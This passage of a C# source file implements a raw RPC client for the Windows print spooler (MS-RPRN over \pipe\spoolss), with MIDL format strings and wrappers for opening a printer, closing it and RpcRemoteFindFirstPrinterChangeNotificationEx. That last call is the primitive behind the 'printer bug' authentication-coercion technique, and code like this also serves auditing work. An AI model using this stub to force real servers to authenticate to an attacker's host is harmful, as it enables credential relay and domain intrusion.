				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x1c,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,
				0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1d,0x00,0x10,0x00,0x30,0xe0,0x00,0x00,0x00,0x00,0x38,0x00,0x40,0x00,0x44,0x02,0x0a,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x01,0x00,0x00,0x32,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1e,0x00,0x10,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x1f,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,
				0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x20,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x21,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,
				0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x22,0x00,0x10,0x00,0x32,0x00,
				0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,
				0x00,0x23,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x24,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x25,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
				0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x26,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,
				0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x27,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,
				0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x28,0x00,0x10,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x29,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,
				0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2a,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2b,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,
				0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2c,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2d,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2e,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
				0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2f,0x00,0x10,
				0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,
				0x00,0x00,0x00,0x00,0x30,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x31,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x32,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x33,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x34,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,
				0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x35,0x00,
				0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,
				0x48,0x00,0x00,0x00,0x00,0x36,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x48,0x00,0x00,0x00,0x00,0x37,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x38,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x39,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,
				0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3a,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,
				0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3b,0x00,0x10,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
				0x3c,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3d,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3e,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,
				0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3f,0x00,0x08,0x00,0x32,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x41,0x00,0x38,0x00,0x30,0x40,
				0x00,0x00,0x00,0x00,0x3c,0x00,0x08,0x00,0x46,0x07,0x0a,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x36,0x00,0x48,0x00,0x08,
				0x00,0x08,0x00,0x48,0x00,0x10,0x00,0x08,0x00,0x0b,0x00,0x18,0x00,0x02,0x00,0x48,0x00,0x20,0x00,0x08,0x00,0x0b,0x00,0x28,0x00,0x3a,0x00,0x70,0x00,
				0x30,0x00,0x08,0x00,0x00

        };

		private static byte[] MIDL_TypeFormatStringx86 = new byte[] {
				0x00,0x00,0x12,0x08,0x25,0x5c,0x11,0x04,0x02,0x00,0x30,0xa0,0x00,0x00,0x11,0x00,0x0e,0x00,0x1b,0x00,0x01,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0x01,
				0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x00,0xe6,0xff,0x5b,0x08,0x08,0x5b,0x11,0x04,0x02,0x00,0x30,0xe1,0x00,0x00,
				0x30,0x41,0x00,0x00,0x12,0x00,0x48,0x00,0x1b,0x01,0x02,0x00,0x19,0x00,0x0c,0x00,0x01,0x00,0x06,0x5b,0x16,0x03,0x14,0x00,0x4b,0x5c,0x46,0x5c,0x10,
				0x00,0x10,0x00,0x12,0x00,0xe6,0xff,0x5b,0x06,0x06,0x08,0x08,0x08,0x08,0x5b,0x1b,0x03,0x14,0x00,0x19,0x00,0x08,0x00,0x01,0x00,0x4b,0x5c,0x48,0x49,
				0x14,0x00,0x00,0x00,0x01,0x00,0x10,0x00,0x10,0x00,0x12,0x00,0xc2,0xff,0x5b,0x4c,0x00,0xc9,0xff,0x5b,0x16,0x03,0x10,0x00,0x4b,0x5c,0x46,0x5c,0x0c,
				0x00,0x0c,0x00,0x12,0x00,0xd0,0xff,0x5b,0x08,0x08,0x08,0x08,0x5b,0x00
        };

		private static byte[] MIDL_TypeFormatStringx64 = new byte[] {
				0x00,0x00,0x12,0x08,0x25,0x5c,0x11,0x04,0x02,0x00,0x30,0xa0,0x00,0x00,0x11,0x00,0x0e,0x00,0x1b,0x00,0x01,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0x01,
				0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,0x08,0x40,0x36,0x5b,0x12,0x00,0xe6,0xff,0x11,0x04,0x02,0x00,0x30,0xe1,0x00,0x00,0x30,0x41,0x00,0x00,
				0x12,0x00,0x38,0x00,0x1b,0x01,0x02,0x00,0x19,0x00,0x0c,0x00,0x01,0x00,0x06,0x5b,0x1a,0x03,0x18,0x00,0x00,0x00,0x0a,0x00,0x06,0x06,0x08,0x08,0x08,
				0x36,0x5c,0x5b,0x12,0x00,0xe2,0xff,0x21,0x03,0x00,0x00,0x19,0x00,0x08,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xda,0xff,0x5c,0x5b,
				0x1a,0x03,0x18,0x00,0x00,0x00,0x08,0x00,0x08,0x08,0x08,0x40,0x36,0x5b,0x12,0x00,0xda,0xff,0x00
        };

		[SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		public rprn()
		{
			Guid interfaceId = new Guid("12345678-1234-ABCD-EF00-0123456789AB");
			if (IntPtr.Size == 8)
			{
				InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, "\\pipe\\spoolss", 1, 0);
			}
			else
			{
				InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, "\\pipe\\spoolss", 1, 0);
			}
		}

		[SecurityPermission(SecurityAction.Demand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		~rprn()
		{
			freeStub();
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DEVMODE_CONTAINER
		{
			Int32 cbBuf;
			IntPtr pDevMode;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct RPC_V2_NOTIFY_OPTIONS_TYPE
		{
			UInt16 Type;
			UInt16 Reserved0;
			UInt32 Reserved1;
			UInt32 Reserved2;
			UInt32 Count;
			IntPtr pFields;
		};

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct RPC_V2_NOTIFY_OPTIONS
		{
			UInt32 Version;
			UInt32 Reserved;
			UInt32 Count;
			/* [unique][size_is] */
			RPC_V2_NOTIFY_OPTIONS_TYPE pTypes;
		};

		[SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		public Int32 RpcOpenPrinter(string pPrinterName, out IntPtr pHandle, string pDatatype, ref DEVMODE_CONTAINER pDevModeContainer, Int32 AccessRequired)
		{
			IntPtr result = IntPtr.Zero;
			IntPtr intptrPrinterName = Marshal.StringToHGlobalUni(pPrinterName);
			IntPtr intptrDatatype = Marshal.StringToHGlobalUni(pDatatype);
			pHandle = IntPtr.Zero;
			try
			{
				if (IntPtr.Size == 8)
				{
					result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(36), pPrinterName, out pHandle, pDatatype, ref pDevModeContainer, AccessRequired);
				}
				else
				{
					IntPtr tempValue = IntPtr.Zero;
					GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
					IntPtr tempValuePointer = handle.AddrOfPinnedObject();
					GCHandle handleDevModeContainer = GCHandle.Alloc(pDevModeContainer, GCHandleType.Pinned);
					IntPtr tempValueDevModeContainer = handleDevModeContainer.AddrOfPinnedObject();
					try
					{
						result = CallNdrClientCall2x86(34, intptrPrinterName, tempValuePointer, intptrDatatype, tempValueDevModeContainer, new IntPtr(AccessRequired));
						// each pinvoke work on a copy of the arguments (without an out specifier)
						// get back the data
						pHandle = Marshal.ReadIntPtr(tempValuePointer);
					}
					finally
					{
						handle.Free();
						handleDevModeContainer.Free();
					}
				}
			}
			catch (SEHException)
			{
				Trace.WriteLine("RpcOpenPrinter failed 0x" + Marshal.GetExceptionCode().ToString("x"));
				return Marshal.GetExceptionCode();
			}
			finally
			{
				if (intptrPrinterName != IntPtr.Zero)
					Marshal.FreeHGlobal(intptrPrinterName);
				if (intptrDatatype != IntPtr.Zero)
					Marshal.FreeHGlobal(intptrDatatype);
			}
			return (int)result.ToInt64();
		}

		[SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		public Int32 RpcClosePrinter(ref IntPtr ServerHandle)
		{
			IntPtr result = IntPtr.Zero;
			try
			{
				if (IntPtr.Size == 8)
				{
					result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(1076), ref ServerHandle);
				}
				else
				{
					IntPtr tempValue = ServerHandle;
					GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
					IntPtr tempValuePointer = handle.AddrOfPinnedObject();
					try
					{
						result = CallNdrClientCall2x86(1018, tempValuePointer);
						// each pinvoke work on a copy of the arguments (without an out specifier)
						// get back the data
						ServerHandle = Marshal.ReadIntPtr(tempValuePointer);
					}
					finally
					{
						handle.Free();
					}
				}
			}
			catch (SEHException)
			{
				Trace.WriteLine("RpcClosePrinter failed 0x" + Marshal.GetExceptionCode().ToString("x"));
				return Marshal.GetExceptionCode();
			}
			return (int)result.ToInt64();
		}

		[SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		public Int32 RpcRemoteFindFirstPrinterChangeNotificationEx(
			/* [in] */ IntPtr hPrinter,
			/* [in] */ UInt32 fdwFlags,
			/* [in] */ UInt32 fdwOptions,
			/* [unique][string][in] */ string pszLocalMachine,
			/* [in] */ UInt32 dwPrinterLocal)
		{
			IntPtr result = IntPtr.Zero;
			IntPtr intptrLocalMachine = Marshal.StringToHGlobalUni(pszLocalMachine);
			try
			{
				if (IntPtr.Size == 8)
				{
					result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2308), hPrinter, fdwFlags, fdwOptions, pszLocalMachine, dwPrinterLocal, IntPtr.Zero);
				}
				else
				{
					try
					{
						result = CallNdrClientCall2x86(2178, hPrinter, new IntPtr(fdwFlags), new IntPtr(fdwOptions), intptrLocalMachine, new IntPtr(dwPrinterLocal), IntPtr.Zero);
						// each pinvoke work on a copy of the arguments (without an out specifier)
						// get back the data
					}
					finally
					{
					}
				}
			}
			catch (SEHException)
			{
				Trace.WriteLine("RpcRemoteFindFirstPrinterChangeNotificationEx failed 0x" + Marshal.GetExceptionCode().ToString("x"));
				return Marshal.GetExceptionCode();
			}
			finally
			{
				if (intptrLocalMachine != IntPtr.Zero)
					Marshal.FreeHGlobal(intptrLocalMachine);
			}
			return (int)result.ToInt64();
		}

    
        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private GCHandle bindinghandle;
        private string PipeName;

        // important: keep a reference on delegate to avoid CallbackOnCollectedDelegate exception
        bind BindDelegate;
        unbind UnbindDelegate;
        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;

        // 5 seconds
        public UInt32 RPCTimeOut = 5000;

        [StructLayout(LayoutKind.Sequential)]
        private struct COMM_FAULT_OFFSETS
        {
            public short CommOffset;
            public short FaultOffset;
        }

        [System.Diagnostics.CodeAnalysis.SuppressMessage("Microsoft.Design", "CA1049:TypesThatOwnNativeResourcesShouldBeDisposable"), StructLayout(LayoutKind.Sequential)]
        private struct GENERIC_BINDING_ROUTINE_PAIR
        {
            public IntPtr Bind;
            public IntPtr Unbind;
        }
        

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_VERSION
        {
            public ushort MajorVersion;
            public ushort MinorVersion;


            public static RPC_VERSION INTERFACE_VERSION = new RPC_VERSION(1, 0);
            public static RPC_VERSION SYNTAX_VERSION = new RPC_VERSION(2, 0);

            public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                MajorVersion = InterfaceVersionMajor;
                MinorVersion = InterfaceVersionMinor;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_SYNTAX_IDENTIFIER
        {
            public Guid SyntaxGUID;
            public RPC_VERSION SyntaxVersion;
        }

        

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_CLIENT_INTERFACE
        {
            public uint Length;
            public RPC_SYNTAX_IDENTIFIER InterfaceId;
            public RPC_SYNTAX_IDENTIFIER TransferSyntax;
            public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
            public uint RpcProtseqEndpointCount;
            public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
            public IntPtr Reserved;
            public IntPtr InterpreterInfo;
            public uint Flags;

            public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B,
                                                              0x10,
                                                              0x48, 0x60);

            public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
                RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
                InterfaceId = new RPC_SYNTAX_IDENTIFIER();
                InterfaceId.SyntaxGUID = iid;
                InterfaceId.SyntaxVersion = rpcVersion;
                rpcVersion = new RPC_VERSION(2, 0);
                TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
                TransferSyntax.SyntaxGUID = IID_SYNTAX;
                TransferSyntax.SyntaxVersion = rpcVersion;
                DispatchTable = IntPtr.Zero;
                RpcProtseqEndpointCount = 0u;
                RpcProtseqEndpoint = IntPtr.Zero;
                Reserved = IntPtr.Zero;
                InterpreterInfo = IntPtr.Zero;
                Flags = 0u;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MIDL_STUB_DESC
        {
            public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
            public IntPtr pfnAllocate;
            public IntPtr pfnFree;
            public IntPtr pAutoBindHandle;
            public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
            public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
            public IntPtr /*EXPR_EVAL*/ apfnExprEval;
            public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
            public IntPtr pFormatTypes;
            public int fCheckBounds;
            /* Ndr library version. */
            public uint Version;
            public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
            public int MIDLVersion;
            public IntPtr CommFaultOffsets;
            // New fields for version 3.0+
            public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
            // Notify routines - added for NT5, MIDL 5.0
            public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
            public IntPtr mFlags;
            // International support routines - added for 64bit post NT5
            public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
            public IntPtr ProxyServerInfo;
            public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
            // Fields up to now present in win2000 release.

            public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                    IntPtr pfnAllocatePtr, IntPtr pfnFreePtr, IntPtr aGenericBindingRoutinePairsPtr)
            {
                pFormatTypes = pFormatTypesPtr;
                RpcInterfaceInformation = RpcInterfaceInformationPtr;
                CommFaultOffsets = IntPtr.Zero;
                pfnAllocate = pfnAllocatePtr;
                pfnFree = pfnFreePtr;
                pAutoBindHandle = IntPtr.Zero;
                apfnNdrRundownRoutines = IntPtr.Zero;
                aGenericBindingRoutinePairs = aGenericBindingRoutinePairsPtr;
                apfnExprEval = IntPtr.Zero;
                aXmitQuintuple = IntPtr.Zero;
                fCheckBounds = 1;
                Version = 0x50002u;
                pMallocFreeStruct = IntPtr.Zero;
                MIDLVersion = 0x8000253;
                aUserMarshalQuadruple = IntPtr.Zero;
                NotifyRoutineTable = IntPtr.Zero;
                mFlags = new IntPtr(0x00000001);
                CsRoutineTables = IntPtr.Zero;
                ProxyServerInfo = IntPtr.Zero;
                pExprInfo = IntPtr.Zero;
            }
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);
            GENERIC_BINDING_ROUTINE_PAIR bindingObject = new GENERIC_BINDING_ROUTINE_PAIR();
            // important: keep a reference to avoid CallbakcOnCollectedDelegate Exception
            BindDelegate = Bind;
            UnbindDelegate = Unbind;
            bindingObject.Bind = Marshal.GetFunctionPointerForDelegate((bind)BindDelegate);
            bindingObject.Unbind = Marshal.GetFunctionPointerForDelegate((unbind)UnbindDelegate);

            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);
            bindinghandle = GCHandle.Alloc(bindingObject, GCHandleType.Pinned);

            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate),
                                                            bindinghandle.AddrOfPinnedObject());

            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            bindinghandle.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);
        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            //Trace.WriteLine("allocating " + memory.ToString());
            return memory;
        }

        delegate void freememory(IntPtr memory);
        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected static void FreeMemory(IntPtr memory)
        {
            //Trace.WriteLine("freeing " + memory.ToString());
            Marshal.FreeHGlobal(memory);
        }

        delegate IntPtr bind(IntPtr IntPtrserver);
        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected IntPtr Bind (IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;

            Trace.WriteLine("Binding to " + server + " " + PipeName);
            status = RpcStringBindingCompose(null, "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0)
            {
                Trace.WriteLine("RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }
            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0)
            {
                Trace.WriteLine("RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
                Trace.WriteLine("RpcBindingSetOption failed with status 0x" + status.ToString("x"));
            }
            Trace.WriteLine("binding ok (handle=" + binding + ")");
            return binding;
        }

        delegate void unbind(IntPtr IntPtrserver, IntPtr hBinding);
        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected static void Unbind(IntPtr IntPtrserver, IntPtr hBinding)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            Trace.WriteLine("unbinding " + server);
            RpcBindingFree(ref hBinding);
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }

